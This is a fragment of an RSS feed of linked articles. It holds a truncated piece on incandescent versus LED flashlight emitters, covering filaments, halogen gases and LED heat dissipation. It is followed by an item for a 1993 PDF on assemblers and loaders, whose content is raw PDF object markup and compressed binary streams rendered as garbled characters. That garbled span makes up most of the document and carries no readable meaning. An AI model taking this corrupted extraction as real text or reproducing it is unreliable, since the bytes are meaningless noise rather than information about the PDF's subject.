Incandescent lamps have been around since the 1800s. They are nothing more than a <a href="http://www.asos1.com/flashlight/IMG_0589b.jpg" onclick="window.open('IMG_0589b.jpg', 'newWindow', 'toolbar=no, directories=no, location=no, status=yes, menubar=no, resizable=no, scrollbars=no, width=820, height=587'); return false">wire</a> that's heated (by driving current through it) until it glows. It's simple and has served us well. It's not, however, very efficient. High power lamps produce a lot of heat and use a lot of energy. Incandescent lamps are also fragile. This isn't a big problem with most stationary lights (in the home, installed into a table lamp or in a light fixture) but in a flashlight, it can be a significant problem. Dropping a flashlight often causes the filament to break (especially if it's lit when dropped). If you're in a situation where you rely on the light for your safety and it uses an incandescent lamp, it's important that you carry a spare lamp. Many of the Maglite flashlights have a spare lamp in the tailcap. Most others don't.   

</p><center><img src="http://www.asos1.com/flashlight/IMG_4510b.jpg" alt=""></center>


<p>
Incandescent lamps have a filament in the glass envelope. The wire that makes up the filament is generally tungsten. In the most common incandescent lamps the glass envelope has the air evacuated, leaving a vacuum. This prevents the tungsten filament from burning (as it would if oxygen were present). This is why an incandescent light bulb instantly burns out when the glass envelope is broken. Other types of incandescent lamps are filled with an inert gas (vs having a vacuum - no gas). Halogen lamps will typically be filled with argon, krypton or xenon gas. Halogen lamps are typically brighter than standard incandescents for a given wattage. That's why many people replace standard lamps with xenon or krypton lamps. 

</p><p>
The image below is an incandescent lamp with the filament lit. As you can imagine, the wire is VERY hot. When the filament is hot, the tungsten is constantly evaporating. In time, the wire becomes thinner and thinner until it opens (burns out). 

</p><center><img src="http://www.asos1.com/flashlight/IMG_0866b.jpg" width="800" height="580" alt=""></center>


<p>
<span face="verdana" color="#ffff00">LED Emitters:</span><br>
Most of the newer, more advanced flashlights use LED (Light Emitting Diode) emitters in place of incandescent lamps. They're typically much more efficient (more light output for a given amount of energy used) and last a very long time. They're generally rated for 50,000 hours or more when operated according to the manufacturer's specifications (i.e., not over-driven to produce more output). LEDs are also much more durable. Dropping them generally causes no damage to the emitter. There were a few early LED flashlights that were easily damaged if dropped but that's no longer an issue.  The LED emitter below is shown at approximately 50x the actual height/width (depending on your monitor and the display resolution). The actual device is 3.45mm wide. 

</p><center><img src="http://www.asos1.com/flashlight/IMG_0593b.jpg" width="800" height="807" alt=""></center>

<p>
In general, common flashlights don't heat up when used. It's surprising to some that high performance LED flashlights heat up when used at or near the highest output level. The ridges or cooling fins around the head of a flashlight aren't cosmetic, they are there to promote cooling. The ridges increase the surface area of the head and therefore make it easier to dissipate the heat produced by the LED. Without the ridges, the light would get significantly hotter which would mean that the LED would run hotter which could cause the LED to fail prematurely. 

</p><p>
Power dissipation in the LED causes it to heat up. The LED dissipates heat because there is current flowing through it and there is a voltage drop across it. The voltage drop will generally be between 3.25 and 3.8v and varies depending on the current flowing through it. The voltage drop is the greatest when the LED is being driven the hardest (most current flowing through it). Higher current must flow to make it brighter. If you look at the Ohm's law formula P=I*E (power dissipation equals current flow multiplied by voltage) you can see that increasing either the voltage or the current cause the power dissipation to increase. Since increasing the current flow also forces an increase in the voltage drop, you can see that when you get more output, you produce more heat. This is why the larger flashlights with higher output must have larger heads (which have more surface area). It's also true that, many times, they have larger heads because they have larger reflectors but even if they didn't need larger reflectors, they would still have to have …</p></div></td></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.asos1.com/flashlight/flashlight01.htm">http://www.asos1.com/flashlight/flashlight01.htm</a></em></p>]]>
            </description>
            <link>http://www.asos1.com/flashlight/flashlight01.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25704336</guid>
            <pubDate>Sat, 09 Jan 2021 20:24:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Assemblers and Loaders (1993) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25703581">thread link</a>) | @Tomte
<br/>
January 9, 2021 | http://www.davidsalomon.name/assem.advertis/asl.pdf | <a href="https://web.archive.org/web/*/http://www.davidsalomon.name/assem.advertis/asl.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div endstream="" endobj="" obj="" type="" page="" parent="" r="" resources="" contents="" mediabox="" cropbox="" rotate="">&gt; 
endobj
8 0 obj
&lt;&lt; 
/ProcSet [ /PDF /Text ] 
/Font &lt;&lt; /F1 67 0 R /F5 77 0 R /F9 26 0 R /F10 27 0 R &gt;&gt; 
/ExtGState &lt;&lt; /GS1 83 0 R &gt;&gt; 
&gt;&gt; 
endobj
9 0 obj
&lt;&lt; /Length 1140 /Filter /FlateDecode &gt;&gt; 
stream
H‰´WmoÛ6*É¶`[­,'¶ÛØÑ`¯¥´Š)ê-èÞ²­öuþV÷SÑ°X‹íïï(Še;ž7&nbsp;àPï¹»çž;]n·ãøeåûn\â*Ï™ŸÀOs$4ÇI’d~ARÌŠ"ó·¿�ÿý8þùWâ¿ÿçíþñ÷øúëîî.ˆÜG?üñáÓÛŸ&gt;¯·¿&gt;ø€Ò¼ÆoŽ„e¸¢Yéçe�Ó<aÿzõ×ýeeÃ8Ž¤n8ˆÒ2Å)"Ñ…<Úx¤�à™"o—�Ì†jzâ™«e@dýˆ`våÅ�5üf‚?joøçµ„dîÜñäÃ ÿÓÓ©11¼i\�°y×¸t�öm="" {qÉÍ$ÆÄq¯k�—Ç'¾¥hÈ¯l.¹'žÜµ†¾ªÑ·a«¨ð¹i&È¨ÿú[:éÀ•¸¸×sÌ="" [†¦ÞdÄ+mÂÕ="Ä™KiLfÃ¡ë`™�·C2’+&nbsp;kÛy€ÜcšÝÔ" þùxå3q`Î–~Üéµd½âuÊs0þ‚ß›olÍm|¤@¦ÙvèÀx¢®="" ³phu£mkqÂ~q`¿Ìd="" &ËhÝò¬z,Ëè="" fe¬Ásnq†.”urwŽ½Ï_:3!ÃŸ¶câßùcÊ€!"prŸÒç,õœv¥ÿçÛñ»ñíöt3²¼Ä%au'Èalg)ÃŒp:‹Š6Œ†-�jjñz¹”õ‹¸Ãg\òš¸€”xteÒÕv¨u¼û6="" ´�1¾;="" åŽ5u…gÎ„iÝ±Ñ!v="" bªÆÂÕ÷ÿ…µÐ!ÂÏ$m+<�68;cÙ¡rv‹rž2Àå´l¦ós©Ìga‚×ó&efßéÍ„.zžyÁg�e—3Ó¨¿Ä-‚úât7‚³'%l«="" Ójø‚ @Œy^ýõêÁbžÖ}ê�[Ê¾2vÁåÚlwzÏÖvt§h`Ûü«¡l#yyg{ÕxÖauÀaëây4="" Á]Üö´*¬[Åðëíx¡½x›šk³{¯×ÞÍx»×ëÞs2.e9à©½ˆ´ÛÇ§|Ü†¡†¼lsët¬~ù¸‡|Ñ#lû0*ÊÃvošò6º©j²Ôñlû<ÿ�²éð¦nÝ¬Žh"="">£Sc½S”ó:•V9´MQ‰N}&amp;;u&gt;ì�LCµ©†jóËüW^aÒ´ZõŸZM÷�†÷µš¥½(Ž•æÉµoQÏ½ÞWË&amp;&gt;öÂ°´ÆÈ®W¿ÙD_»&nbsp;xáµ†³ZýRcúÌ˜î‚“¦Ýtµ·ê5‹n"8c@eZcu¤Œ ãÓÐ´zýîF¾2yKù”*»1!C[ù+‹¥ˆ'*pÁÀ×7¡žZ�3äî‚–†"ØH=-½…iêé©–¸ÁCwjÌ1Š(e·Ðí,å¶›MŠRØŸ¡æ“z‰É4ûžn¿nÃ9j½L‘ïÍ&amp;à—w¢fºÒMÕNÿP£‹3˜¹Ü1Ö
CÝ°Ýiïõlbhïv©‡fKŸ»â™ÓL$µ§Ø…¹‘­ö�“¢_w
endstream
endobj
10 0 obj
&lt;&lt; 
/Type /Page 
/Parent 105 0 R 
/Resources 11 0 R 
/Contents 12 0 R 
/MediaBox [ 0 0 612 792 ] 
/CropBox [ 0 0 612 792 ] 
/Rotate 0 
&gt;&gt; 
endobj
11 0 obj
&lt;&lt; 
/ProcSet [ /PDF /Text ] 
/Font &lt;&lt; /F1 67 0 R /F5 77 0 R /F9 26 0 R /F12 28 0 R &gt;&gt; 
/ExtGState &lt;&lt; /GS1 83 0 R &gt;&gt; 
&gt;&gt; 
endobj
12 0 obj
&lt;&lt; /Length 1352 /Filter /FlateDecode &gt;&gt; 
stream
H‰œWmoÛ6"Y± [±$'¶ÛFVë`&nbsp;Œ™–H‰’:Ûú
ìëü­Ù§¡-:`°Ø~þø"R¤l%m ¡ÝswÏ=w<!--?;L÷¯š$Oï¦5l)’Œþ´Ç#˜×NªÃ¢ªÊäð×4KÞO÷¯Ë“÷Ÿèùðûõïô
xþ÷ÇÏo?~þ”îrTU°þK?üJñs�ßPPD8~{Ì�Y–•	©+ˆIV0ü7`tnÛé®¬

RGéçô…nè3ú©ÆëÛ,G¾KýÕ¨†¬V×Üa–ìrX4y•^´•DÏ¥ý÷ÏmyÖkŸA¹®|2v]öÀK¹ç	=—Ü×CåUsjs§‡­påHW	{¯´Øï—,¸ŸÐŠæ­/‚ùZðÈ§ÉL�³÷–¡Ì­¢nbî±Ü�JÌ9WDKÔQekÑnÛš”¢&9M°,/Š<wUÁ¬æUße0Ã9¥¾Ô+A°ÔKU‚£ÈJì¹øè�ÚÇÞ¥-NO<^F&¶åŠGQd_2†spµ°­ˆöò0Í“ÉW–XD�'Tˆà$ƒ¸©“ÞNßMŸîÒUAjjV4F\¦”�›ôðçt‡XäŒÌªÆXð¹éÈ¼¼bÊ²ÖÒ�Üè„²hE°dt‚;µ M+ÒøE1Î‹—]!�ë£BRÇC®7×g›½üðƒþt#?x,º™/ûd)¤ùî‘O®QæLõ‹MâD³V—R+ŽmZ9§¬xá©¢ç·©fé˜–ñ)K7ZøK=W57ž€È÷‚PK¤¼=¼¶|ÑVÉJÂù†Ød…ÎfíTÐXaö±i?:eï1}èF¢ív¨MD~uºìuÄ|—j6`p™6%¬ÁÂŸÈyx<¬ŽåW€­aO„Û"\u"Ìg­N¤0X‰È ³Å_Â…¯s]S7{�«•–­
J/¾’°æOü'˜hñ°:·#Ó‰’éxFT=ÖR"=^x³‡®õcO¬={%Ö'"ÈÈÀ¨
|5§yš"i~œ/Û¼ÅpÕdXÊŒÖzqµª®ƒ0Ð2Ù˜‘(uãˆ»(\‹¯¨ESŠ¿rnL‹ý0ÁG’ì™ŽN+±á¡ñXVHæ¤hìám†C¹»Aãk³W*©Oçt„?¥tß`Òü,7$®zo”»8Ä™•"D-ìû‹€cî'V¤iäËCm%µ-Ãl`†èb¤7’sO#™1X“Ú}Yˆ§ûN£0Ï ÁUÓNuáS®-->!Õ�å	)…3^\NptLã6pºj&nbsp;oh[ÆßJâq¸˜ÝÊ)6¸þ
V*ùê=ÚNwV…7yé.½U¨´cÇL]uÙXmŽb¤÷Ç1ÊñlÁÒš³ÂÈ½RýrßÜW¹:'f|ÜI³PÃi!­u¦¶zÎq'¤n{ÆwÒxØVI%ç:H=&gt;4yjº ö¦•¢e×»‰{Ë_Bž|Ð»ú�ªÂOu•H�Þ½&amp;Ó/G¢K**è¡Î[2Ámj�lËvÏíˆ)šî³(+!bü-úrY3í}Ã.k¸YÅ7¢a¾d�G¨„Y^ ñíêBíî“‰eGtQ¼á9ÝÃµ-]­ãˆÐšaPÞhíL’óð›¯_¬¶ñÐ&gt;îÚÌEqB¿“ê’-©]¡¶±ñ•�HŒU'žÀ›iúnw]ö
¦í(ãŽÖ4°ÝõÏXß‘ÌnUŠºû–ÜjŠ‘�–È�hsL!ÓÁ¬‚¦g³ù¶#ÓÃÀ­Ùx¼×Vv�‘ˆZÛXTÜ=Ô�™ÕÌ¹ÝÙ=$l¤¸þ`©¿é/
endstream
endobj
13 0 obj
&lt;&lt; 
/Type /Page 
/Parent 104 0 R 
/Resources 14 0 R 
/Contents 15 0 R 
/MediaBox [ 0 0 612 792 ] 
/CropBox [ 0 0 612 792 ] 
/Rotate 0 
&gt;&gt; 
endobj
14 0 obj
&lt;&lt; 
/ProcSet [ /PDF /Text ] 
/Font &lt;&lt; /F1 67 0 R /F5 77 0 R /F9 26 0 R &gt;&gt; 
/ExtGState &lt;&lt; /GS1 83 0 R &gt;&gt; 
&gt;&gt; 
endobj
15 0 obj
&lt;&lt; /Length 742 /Filter /FlateDecode &gt;&gt; 
stream
H‰œ•]OÛ0†/h£’²$-M'X-�„Ó­nì8±ƒvÅ&gt;�v»ÜÁ®&amp;@›4&amp;
¤íçïØŽÓ´k�N•"×±Ÿ÷ø=&gt;'ç•?ÿX"Šª_’²(8JáW)+Hš¦94#\ˆU?üÝúó‹ÏÝÞÃ¸úª¿ýKü'™QXŒßý¼{¸¾{¸O¾TŸN
¼"+4¼Rž“’åR�¬H¹‚_ângÜ™&amp;³\pRâáÁUJY2ËdF2\&amp;N_MÄ¡™b¸Áˆá‰YF%“DàñôD‹§hF	CÕû;·X&gt;‚õyè¨§Ú™'#«¡š2pŽ£¾UŽ/´ÈÄN9í`¬ðüHWÓZqÇ*î‡ú$
0˜LôfÏsWÉºÓx›©Ç–z¡™‘…Â1pp•,&lt;ãIaíŠE«ÌËÌF}ÙÀxZÀf	Ÿá³å„d2w—ÕÜ#+Wö^(Ë�ØiÛíË%ãŸ©àZ…n�zÊ�ô \à×zS¬a�-‹†A¬P§
"IqŒžiw#Ù«„ŽºŒ¸íñV¯¬†A&amp;Ž¶.Þ¦‚™�W0Ó'0ÿ”âÚ¼kÈMvGa´ÀÅšÖ³7‡çg¿:ý,SŒæŒ©úÏmý7îËÀkÛ»rBo“+�³ou4zq°h5¨ôOÛˆi±ìª¹×/m�#]ö¡
¼–;uÍM¥p_óœéFjÇM›æ%„¦“‚ZÁHŽCwº»çvúÃÝˆ‰Êúµ
|¨J:Ãº
v�Hk}¨|Š¾!ŸIU(¨ø(¤JIVJôëÚ¿ñÏ«Çú;/$‘”—KQÁ�Ž“ê»?Ë8áTåGšüÈŽ»½9;GÛ˜SÀMK©ñæ�õfß‹fÆuüÚ�Hý“©ëtú‘ÛXÃðJM£Qøv	Éµ+åv®,Â�ƒ¸Ê”ÇÏíX°<c¾›¬�lïìz{p«°w% boõû1)="" Ï‹ÿÉw[`|ìÖø¿="" �¤z="" endstream="" endobj="" 16="" 0="" obj="" <<="" type="" page="" parent="" 104="" r="" resources="" 17="" contents="" 18="" mediabox="" [="" 612="" 792="" ]="" cropbox="" rotate="">&gt; 
endobj
17 0 obj
&lt;&lt; 
/ProcSet [ /PDF /Text ] 
/Font &lt;&lt; /F3 79 0 R /F10 27 0 R /F14 29 0 R &gt;&gt; 
/ExtGState &lt;&lt; /GS1 83 0 R &gt;&gt; 
&gt;&gt; 
endobj
18 0 obj
&lt;&lt; /Length 1840 /Filter /FlateDecode &gt;&gt; 
stream
H‰„ËnÛF¨´2	J!—¶˜Ô�ˆnÚ„Jk†\&gt;D^‹&gt;€^«[ÜSÑ-ÐK{èïw;Ë¥"76`ÏÎÎÌÎ{†ß7ï~hò:?~Ø4]9ô]—Wð+pmú²ªª.ïú¶lÇÁäÇ¿6UþûæÝ�?×ùïÿ|üÿü»)‚põXÕ&amp;Z¯öÇ?7ß7uþG¾©MWŽ‡¼ëÀŸ×U_vð¿*Ç±Ïÿþmóaó-ªP·¬ÃXŽ½éIÖ-ð›nÈ›±+ûÊt¨Áûâ³ÅþÁ@S,Õê"ùeÀ�Up÷ìàCy&nbsp;CŒ·DKüËT‰F¦.åÓ¥^î�~(®øî«BYp;1!¤ãlÁ§ç/&gt;¿NoÊ¾¸%ºˆ¯6kÂÄwþ{‰òG’�MY™Žîö¿Ú&lt;˜ü¡.Á»ßmª²5èÏ÷Å:ÐkQ±¯JSÜ²ŠbR'ø�Æ×X-@4E„··ù}(¼OåÀ‘„�š	Š”ÐØ§T”íÄª�ÌÕž¼f
ãÂXY÷'Á’b£"'B	ƒ‹\§ä…ã[N¥÷…Ž¤}*Ž/ãôJÔI«Xë-ëB§)Þ®Ø„ËÌY€¬àrñë†¾HýdÁ1¯–:w
HÇäºD A÷_~&amp;àW×¯¯–ÇïœEeßŒl•S¥�„©}Uò7»Ð»3ÅE¬Ö±^­Änæ`Ó¡yÊLGÙ=[f’˜—{gæ¿ðÈN¶Ê\n™šYuJ®'w&lt;î=›:3°Q�Bû‡¶2Àº’lÂã“%’+-ÀbÊaƒk[ƒ©p/&lt;¯"r¼=¥a�Hí&amp;"á-†¥-TÆ:Ê¿V,ðv²J÷¥W)îë©…Ê,«GìÔý†KJÎ·xÏÈuzw’°gBõÖt]±Õ@P–J|ìÕJ@Æ�’
Ekƒ|÷ÂåÛ²à»‡€‚b;V¶RrVºüØ®Øz�É$‘QTÆ�ï€�Ï
¼·³Wd4±ë0ˆ'IÃI˜™
¸&lt;Ô
ûä%\’ßcÍ/
©/CAL‰!Ó‹-¡�Š9¬G1”0ŒM:"¦¶+¾Ø
V‹Š\bcKW�5kÿ¬vB{Ö`¾¢z"CCÐÂ+ƒ¦fcO¢d3Œ†Ù”Z#çƒn,Ø1%øK¯Ù™bÓ0f�ôwÐÙŽ�º¤�¨„È{Í]=ÍK.Cx&gt;:ŽwÏoª›úæó×æ´=K2°y¸t:`[båÙR¦Q‘•ÌÇ«H±Ý·‘ðaÐù’z;Ì÷ÎŽ¦!µÓ%yÁGî¹x)”B�¦î�­¯ô	!ƒÍEæ)×PBXh¶Eh¯§·öòÅ4Þ†'æŽ¡y4F/ö–&amp;�^&lt;Þ&lt;1ºH´7/E™ð,”„QÖ'êjz‡BÕˆZXRAL�4ó”�G
o¥"BÓ€·.ƒ�ÁÖºqÁGpQ”98ÔÙ•ÀZâ£€eÃ’Wñ’Wwe?°ãÁºSØÙŽ;ã´š²éŒaŠ÷Oæ5+”(§f¤Â“÷çÞ‡M«­öýpœ¾]¹—OŒM”@T‡¹ÝÝÆ²ê†7¸Ã8ÌÙF’m#(AAÐ©Š1pcP¨=ÒØ
íòŠÑ3¬	4z¬Á~OÔJGnÆ1f6nÓf«•è4Õ±RŸ”»ç/ºëé5ufGí¤Ë;1ðÍÐMbàÔƒ˜¯®Óæ©B`opÇ¾$2DDõ±¤vJ~Í{ïU{í¥s¦.VþJ#t2Üè0Û#É„‰íž&lt;}W·v“ûÔzßt=öT°)ã†iv"Á4ˆ{$žæx+A&nbsp;Ë33=ÝêÄß~Ù~‘p¾p&amp;çÑ:!¸àØ×v'ýàS·¦›/×)ãjQMƒ^ê«IáH°—Ó~Fg?›Y¾–+o=¦±ÉR•@TCkX%ÝÕV†9Š¡t¡LM'tí

JöÛóÙ‹ÕußO›acð#ÐEN¶ìÓ §kž#íyÝv'A$âÉÞGt	=%„N¦À2kâ-^)ð¶ˆÒª299h«÷1ÇÛAªb×p5|xqÅ`S„rïnä°Ôl’»ÕØè&lt;òw–_£ÄÇ:oí–æämGàéEŸÛ±±}xä&gt;|ÉRgä“®-Hhív×w*‘?'øf‹Pœ,¥B&nbsp;¥B;j$D¡9`î½T	õ,ƒ�¨hy%t¤.5ø™Ùæ¼)7‡fö¥IiZ÷öïå¬æšZ–&nbsp;•óÐìK	ìÚÆ‰Eó�O(˜¨#o\	“ð &amp;tF‹="3­�B”áDàwÇM8BYhÍÁ§ø5…otÓyÞJ]˜Ž~SÅ3N¶×ä–ªr}!öôìd{Ð¡Xæ£è³\Ídç¢/$4¨]mYóPfN!«*Þ¸¬F³ˆs{×Í#�ÄT&amp;ÖS³PâUËAaª3_|Añ^“ÌeÈMå€ºÆïŒ½HuŸeÂ‘ª]è
¡ƒçÀFVö§FóX„¢\ºHé½•³äê‰ñýqóŸ2u�Å
endstream
endobj
19 0 obj
&lt;&lt; 
/Type /Page 
/Parent 104 0 R 
/Resources 20 0 R 
/Contents 21 0 R 
/MediaBox [ 0 0 612 792 ] 
/CropBox [ 0 0 612 792 ] 
/Rotate 0 
&gt;&gt; 
endobj
20 0 obj
&lt;&lt; 
/ProcSet [ /PDF /Text ] 
/Font &lt;&lt; /F9 26 0 R /F14 29 0 R &gt;&gt; 
/ExtGState &lt;&lt; /GS1 83 0 R &gt;&gt; 
&gt;&gt; 
endobj
21 0 obj
&lt;&lt; /Length 3116 /Filter /FlateDecode &gt;&gt; 
stream
H‰|WK�#¹
ÖUvÊ3e©Ç5™îž±‹ì$í©÷#¯M6Aä }›É!Xì.ö�KrH~~¤�¤¤òcÑ€»DQI‘Éo^^}üó´¯ö/ß¿OSß·ûÒüñgU÷§²,»ýP5§vºýË¿^•û^}üËß«ýÿ1ß/ßÚŸÿ¾útøß�?Ÿ+Ã~øÛ¿¿ûþØ”§úðÏo¿;þãå¯æŽª¥K&amp;#¹îq	ºKúq85}Ùâ’SÛô	ÞÅùñ¹)G#oŸëá46ŸËªË3¢7‡(^®’4-¼fUgQ‘€Uˆ*s_ZÛ�åòî
Þ÷Û÷5-—B°Žr{Ñôì¥ÝF&nbsp;�È·ûcex¦ÃäÄç¸Ì:¨Ü?W§zÿò'ñfJw.VVH¤
s¦iÈªîµZ®&nbsp;‹Þãpm÷]3àü©­’q²&lt;;(m²gŽÏ†áð±ûÕW5}ZQµN±8U‡tnòƒÝÿõûéž¾nùƒæI–Áä5q'½’ì�¿ùíû§Œ65KÝ-f?ÞÁšçÚûâÔ—zXniÆñÔâ;CH{0âÊvØåB¸ØÙ¼ZK ¹€’�¹ƒÝ;új$§ IþUßp@ÝÐB…|êT¥.^~.a`ïm«ÉHL92Ûº4RRkf[�ºbF¤REwÓ¹éö›9éV¥"_'«•ø$OåôREyÌÜ*Û9Šñ¶x¿:Îlx^¿mqã´½3ëÔWõøÓáÙŒ“qÈÇîá]-Uè˜¾»‹¼1œ½ñ�b¬6³gÐá‘›É�]¨ô;û¥¢…<a Ç1™:#l9kÛ¶nÈrƒtþ!íj’‹¾á`b²¹"ä›§g«Ê‹…°n÷z?&9ù“ k…w•»="" �¦:ÎõƒÝ´oóÖ©r,úú�Óýëé]¨²3x¨y|°v†é�9r="" ‹�zzƒð`Ð‘<rp±ÊÎµã!ñ‚Æ3±i®Â="" Ü3dpf:Á:^m="" ãlsfis;a°ë1Úg¥"ÞÇ®;õ{\Ú5�m'*z}É:ëpïÖkô½="" ka_z¨èlb%zj–@)Ø‘Ù�úÃ˜,xÓ×y›{×¹z.]¤c›Çm,Ÿ™�¿{tƒ@+x="" �öµèÐ4(º¡¿…*Ñj-Ù—§*="" 6çæo’üj-ë="" ÿ»ªc´p•¹³µf§‰â·'r}xy+\�„‚0ndÏ="" =�qôíqlë^ÿbmtñh=""  ÄÛ”9¸á¬hu™œâçtåá¼ðqœi´�?#kgk?•ví6ŽînÔy;ð“¯¿="" ÆÖ,“tø(ŠíÙœä$Ú©æœj8ëcçks×îd®2½rç�d{Æwq�˜ý0Îñ£i«yÔúÍ¿êpù,¹z‡="" ³ÃbÜª|c="" vf]©="`Hg—" ×~p�¢ÓhÀäcíá="" ,�="À&quot;" –Ætåósr§{½*Âl="" Šx="" Å‚ÞÈ~lí¤;,�Ò$o^="" Å›a�^g]é&9ï,kÝ´6d8¢]ÿôfv‚lrÜ»<^Ê·Â«‹þ–èwÒ"Ø“%›d÷2~c¶p="" ™çv7Ég#¶y¸èaÇ©£—\*)jª0)ÒÕate¦Ëéåz»pia;¸–è¦Ê*fr…@vyik¹i!mžyú3t%–ÿËÈñ_wm*['”¦ÿ¦(vaÝË®÷�ŠÕ´kÌ‹¦Õ“È)g="" í[Øµ_a]}#¯^gb#="" �Õ„Úëe="" ËyüÎ¾u¡!="" 4|oéyÍÖ:y²þu�®�"†¿98{{¥ƒl="" dÛ*-Ÿ:^†Üo²˜÷šmÖ~“¬="" ¶ùŒj»Ð�¶çqhÂ«kÛp{z�–õt±ip©:kbú&†d‘="" &="">
á–k­ºz<!--¤Dy<ò¨ðÆô]vx´'`ì8j©�%¸
ÌúÕN\–n��U?±�P¦³.YÒ}øÆ�æ+€Ða}0ÅUê©ã�gº
X�ÚV`Ià�Ärãh³Þ¾ECý‹gâ|œì‚ä0	ÇY[4�ÓsÍM+hƒ\°¼¯’÷%`O6Ê[ÃžÈ4Ðr�ŒŽF¦�*dµ”:ôÇËP‹ê¢V®�õL�|¶*8Lf½‘]Óñ’Ñz4JmÔýAR­)íÌµve‡ÿoh§§”½6Lâuãæs�«ÎP”„Ürdœ¹Âœ¹8þÑ†BSµ&-->ÞñW{øÊÑÞVŽX¾;ïJð¡W÷þó­ÿ,ýgç?ƒc?{�òþöþm}¥�‹ùÔÌ’X(„røÜ¸UœÐ
D&lt;=±©äÃ¥Íg?Á¥V­ÒTSÏ†wz”ÕÂwo*wªuÌ+j¡lóL[KWi­ÓdVí7TÎÃÞEUo§‘ƒÏ3ã$·¦I¯l[t'æ&nbsp;&amp;}´Ò‰
èÄ@‘N|×;1ðIþbá;1,ö…‰{0Eá±§Ùù¨H6áî- çÝlso3D*ß Ú…éR
ÈÛ­TK°&gt;9"Í÷¶NRg|ñÁÏ!ùBNhW÷©ÉQélñ~’ã4ºPÊ6Ü(‘?ÔÒ»ÁPÄ+yEb€)²&nbsp;v_†M¸n¢;c¸0Ðº
‡©&lt;äS™p&nbsp;À":j’„M'!Ðs-È=±{}¬ÄÖ:—R�	éÌ×|ÁÒ=‰¤ƒÕªþ'Q{v€}5�¾üdq²¶L•±|I!ýQud@Å'&lt;Vj9äÝP"ÓØ&gt;=m¯T½î|ìÎ»ZºNLúuVçoÕéYRàÈ“|ð;aÌÅñ4(Är—èE°;Ï)@1W[ó«!¿Ìª»bÈô¤ø4Z/©QcöQjãfèK’MiJ½ÂÂ7yã/™lìâÄ_"ˆÇ/váU|&nbsp;PÁz‡Ä·×ÄL˜š‡Ö±­¾&gt;·-O&gt;a¡&nbsp;jã
»­è2UÎ”wkÎ
1­)rÀ¯„væVSõe&nbsp;�)‰Câ\7Ôú)6“ñéÃñæàê²”otB$G&gt;.gÝyQPIÈC®²6eË£ /4¬ÅB¶”�MÇ¿#l&nbsp;—Av�åòbt¥+ØE^:t¤“Üè´ßÜ¼!»—7:ÅKXP;þþ²höfæõ8�^ý¹­&amp;™SÚ²&amp;Û»Ë†NÖÄ-í§iÇ„[v|¡Í`²ƒÜ/d¸
0r^[œ$&amp;²¸DŸw�.ro¢ÙoÄ¢øúÎ&gt;k–¬ÞŸƒÄ•©ø6T´Ýë”–n¼&nbsp;…¦Ð^Úš~D5OŸËþü!$Î×
½Ê×AV3;bSN•IÕte¯8¯›WÆq«VrwÛõÆ?oéƒ"EŽÈcöò&amp;‘ÞÛòõ.åèTŒYâý
j…ñÊxJá?g»ÚáØÇîÜ”éoç.?�åOT·ì›iL,±N«M÷ÅTkV©nL÷…w¨îÙÏ;ô@ïå(|æÔ”p&amp;G*U¤:Ž©ÆõRãˆú%
�ˆ¡&amp;GG(ÂwTjÿž7†O:ôÜ‡:¼f£&amp;ÅÐçàÜ wçÀ‰=Ô&nbsp;ððe!˜ß()�+±—°Yâ$
b¢8lYlî_¢í§Ã�í‰Ú�æIZe‰\`j.ˆËó¤�¨#Bª�Ë×»Ò‰0Âå¡p¼þõp™±;�Á�0¹
dyxjòŠè%Y[ÞÎ?Oã¡¢�‰;‚"²1-›Kwæ…b9…˜ýü@Ž¿�ÇÅ,³©d…’— GT±åS¥èlG»†�QLÜì1+$CÙº:rõ‰$8öÔžkÆƒóãuk$!˜G†*ƒÁr×—ÊDÈŒ~ž&nbsp;uè&lt;eBÌ†?¯nZ®&gt;œ
4Zu��2¤ÁÁð‰VÐþ&lt;ÌúßÚDqQx{%eê&nbsp;iùiŸ\é–ž“Ï2¡þŸíj×a†�CS$†
�Ä\ºt/Ð?àÿ¿…Ø—‹\7[lC”øq¹3ñô~i·Gu‹rÚv
ƒÝàê60»{˜Åla&nbsp;C/¥«¦Ý=ûcnÐM´M€*œ[Ãœð�«Î�[•A-‡"‹òW¥[ãò1íš²?Q”åß(Ãÿž˜Ømøý!
¼<iðÂ°r½Äx•¡Èjq-ãã1c�à\Ùk8ùcãn †ÇtŒŠ•t|ÏÇ%À�Ïc‰x="" endstream="" endobj="" 22="" 0="" obj="" <<="" type="" page="" parent="" 104="" r="" resources="" 23="" contents="" 24="" mediabox="" [="" 612="" 792="" ]="" cropbox="" rotate="">&gt; 
endobj
23 0 obj
&lt;&lt; 
/ProcSet [ /PDF /Text ] 
/Font &lt;&lt; /F1 67 0 R /F7 25 0 R /F9 26 0 R /F14 29 0 R /F16 30 0 R /F18 31 0 R 
/T1 32 0 R &gt;&gt; 
/ExtGState &lt;&lt; /GS1 83 0 R &gt;&gt; 
&gt;&gt; 
endobj
24 0 obj
&lt;&lt; /Length 2845 /Filter /FlateDecode &gt;&gt; 
stream
H‰|WÝ�Ü¶²’V‚öN"ïViì³w
»9mŠ[ë‹Ò
ÐÔpœ¤Oºowy‚8p�¼´íŸßùàPÔÞžax�GÃáof~|w¼xûaÜÖÛãÇ‹Ã~ìûn[Á?;ìÚvß™Ál‡Ž\TÛß/ÞþðÏzûû`|üþ{q_þãß¿}ÜµUùË¯¿íîêf8”ÿûôéÓîçãßáuÇßÁpÓÓ7ì°nú}UUfÛ†}ÛW~ã¾L²‡ªnà¿Éwwè˜2	yÔ—¸”Eœã:š—»fØh˜-D{¹»éP†ZãÆ«bÚÕ—œ¨$Î|a¸‘Q¤‚,Ô2Si.Ãdío¸ÙÑ~áû¹«Êäd®ýy´$"üIyBÇ~N¡«¶wõ¾Ùß_Tû¡ïŽµÆPtÕ¾f?-Ó€-¬Õ’Œd,oÊ@¥¢¢iÁ‹”è(ëZWÁÐ*¯b4ŸOj5_�–™
ð3M&nbsp;
‘QÀØÈS§S´'L··µdvCÇ&gt;~#°Ò*â¯·UocÓ�ä9ˆê¶½’µõ®’+˜Ïîô…¢¡LÃÄ­†"Â4ðÝÍÈ_g&amp;LEQ Àr{pžÌP¥EJðá¡^¸h\Š=D�(
